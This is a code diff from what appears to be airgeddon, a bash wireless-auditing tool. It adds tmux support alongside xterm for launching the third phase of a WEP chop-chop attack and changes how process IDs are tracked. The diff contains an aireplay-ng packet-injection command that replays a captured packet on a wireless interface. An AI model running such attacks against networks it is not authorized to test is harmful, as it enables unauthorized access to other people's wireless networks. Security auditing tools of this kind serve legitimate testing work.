@@ -3049,13 +3049,27 @@ function set_wep_script() {
 						if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
 	EOF
 
-	cat >&6 <<-EOF
-						xterm -hold -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
-	EOF
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&6 <<-EOF
+							start_tmux_processes "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+							wep_script_processes+=("\${global_process_pid}")
+							global_process_pid=""
+		EOF
+	else
+		cat >&6 <<-EOF
+							xterm -hold -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
+		EOF
+	fi
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		cat >&6 <<-'EOF'
+							wep_script_processes+=($!)
+		EOF
+	fi
 
 	cat >&6 <<-'EOF'
-						wep_script_processes+=($!)
-						wep_chopchop_phase=4
+							wep_chopchop_phase=4
 					fi
 				;;
 			esac
